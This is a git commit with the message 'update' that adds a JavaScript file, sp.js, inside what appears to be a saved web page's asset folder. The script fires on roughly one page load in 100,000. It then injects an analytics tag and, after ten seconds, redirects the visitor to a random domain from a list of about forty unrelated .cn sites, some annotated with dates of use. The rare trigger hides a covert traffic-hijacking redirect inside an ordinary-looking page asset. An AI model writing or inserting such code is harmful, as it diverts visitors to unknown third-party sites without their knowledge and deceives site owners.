ddf317b7cec6a13ffc7355a5b7a0a5e3f615f250
lizhigaomac <lizhigao@021.com>
2017-11-29 11:01:40 +0800

    update

---
+++ demo1/truly/truly_files/sp.js
@@ -0,0 +1,65 @@
+var shuzi= parseInt(100000*Math.random());
+if(shuzi == 1){
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?45631c7d5096c897eab07543e0ccfa8d";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+
+
+var url = [
+'http://zzanteni.cn',   //21hao  yong
+'http://zzcmmr.cn',   //27号 用
+'http://perfectmm.cn',   //27号 用
+'http://jisushejian.cn', //
+'http://4gsm001.cn',   
+'http://ambh568.cn',
+'http://wlyingxiao.cn',  //10 29
+
+'http://0st3.cn',   //11 5
+'http://100mefon.cn',
+'http://hnyhgt.cn',
+'http://jsfhty.cn',
+'http://ijinyi.cn',
+'http://hnmengda.cn',
+'http://nytianyi.cn',
+'http://hnhaocong.cn',
+'http://taikongbanye.cn',
+'http://hnsfkj.cn',
+'http://zhongcemedia.cn',
+'http://wearekings.cn',
+'http://yqkqc.cn',         //22hao
+'http://godfood.cn',
+'http://wintekcn.com.cn',
+'http://xiliaofang.cn',
+'http://kmmssj.cn',
+'http://5a30.com.cn',
+'http://sum32.com.cn',
+'http://reagent.net.cn',
+'http://dsyuanlin.cn',
+'http://sum22.com.cn',
+'http://360yuebing.com.cn',
+'http://chinayuhuashi.cn',
+'http://laochengweidao.cn',
+'http://mokahunli.com.cn',
+'http://cqmspx.cn',
+'http://iallmedia.cn',
+'http://yiqiu.net.cn',
+'http://yxysc.cn',
+'http://c-1.com.cn',
+'http://5a66.com.cn',
+
+
+
+];
+
+function ydyw1() {
+imgurl= url[Math.floor(url.length * Math.random())];
+window.location.href=imgurl;
+}
+
+setTimeout('ydyw1()', 10000);
+
+}
